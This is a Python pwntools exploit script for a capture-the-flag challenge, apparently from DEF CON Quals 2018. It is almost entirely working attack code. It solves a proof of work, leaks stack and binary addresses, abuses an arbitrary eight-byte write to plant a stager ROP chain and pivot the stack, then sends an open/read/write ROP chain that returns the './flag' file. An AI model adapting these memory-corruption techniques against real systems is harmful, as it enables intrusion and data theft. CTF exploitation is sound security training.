#!/usr/bin/python
from pwn import *
import sys

HOST = "f5a0cee8.quals2018.oooverflow.io"
PORT = 9993

def solve_pow():
    log.info("Solving pow...")

    chal = r.recvline()[:-1]
    print chal

    pow = process(["python", "stumblerpow.py", chal, "16"])
    solution = pow.recvline()
    pow.close()

    r.sendline(solution.strip())

    log.info("Pow finished...")

# Will write 8 bytes of data to the address passed as guessing number
def write_value(addr, value):
    log.info("Write to %s : %s" % (hex(addr), hex(value)))

    r.recvuntil("So, uh, do you want to play a game? (Y/N) ", timeout=1)
    r.sendline("y")
    r.recvuntil("COOL!  Guess a number: ")
    r.sendline(hex(addr)[2:])
    r.recvuntil("CORRECT!  OK, HERE WE GO!\n")
    r.recv(8)

    r.send(p64(value))

def exploit(r):
    solve_pow()

    log.info("Leak app stack")

    r.recvuntil("So, uh, do you want to play a game? (Y/N) ")
    r.sendline("n");

    r.recvuntil("WEAK!  Take this I guess...\n")
    r.recvuntil("WEAK!  Take this I guess...\n")

    stack = r.recv(0x100, timeout=0.5)

    STACK = u64(stack[17:17+8])    
    eAPP.address = u64(stack[25:25+8]) - 0x605
    
    log.info("APPINIT                 : %s" % hex(eAPP.address))
    log.info("STACK                   : %s" % hex(STACK))
    
    log.info("Create stager ropchain (will read complete ropchain)")

    POPRAX = eAPP.address + 0x23b
    POPRDX = eAPP.address + 0xc20
    POPRDI = eAPP.address + 0x7fe
    POPRSIR15 = eAPP.address + 0x7fc
    SYSCALL = eAPP.address + 0x1033
    ADDRSP160 = eAPP.address + 0xab0

    # recv_all(fd, buffer, 0x1000)
    write_value(STACK-0xa0+0x160, POPRDX)
    write_value(STACK-0xa0+0x168, 0x1000)
    write_value(STACK-0xa0+0x170, eAPP.symbols["recv_all"])
    write_value(STACK-0xa0, ADDRSP160)                          # stack pivot
    
    log.info("Create final ropchain (open/read/write)")

    payload = "A"*296

    # open("./flag", 0, 0)
    payload += p64(POPRAX)
    payload += p64(2)
    payload += p64(POPRDI)
    payload += p64(STACK+0x160)
    payload += p64(POPRSIR15)
    payload += p64(0)
    payload += p64(0)
    payload += p64(POPRDX)
    payload += p64(0)
    payload += p64(SYSCALL)

    # read(11, rsp+0x160, 100)
    payload += p64(POPRAX)
    payload += p64(0)
    payload += p64(POPRDI)
    payload += p64(11)
    payload += p64(POPRSIR15)
    payload += p64(STACK+0x160)
    payload += p64(0)
    payload += p64(POPRDX)
    payload += p64(100)
    payload += p64(SYSCALL)

    # write(6, rsp+0x160, 100)
    payload += p64(POPRDI)
    payload += p64(6)
    payload += p64(POPRSIR15)
    payload += p64(STACK+0x160)
    payload += p64(0)
    payload += p64(eAPP.symbols["send_all"])
    payload += p64(eAPP.symbols["recv_all"])
    payload += "./flag\x00"

    r.sendline(payload)

    r.interactive()

    return

if __name__ == "__main__":
    eAPP = ELF("./app_init")

    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
    	HOST = "localhost"
    	PORT = 9993
        r = remote(HOST, PORT)
        pause()
        exploit(r)
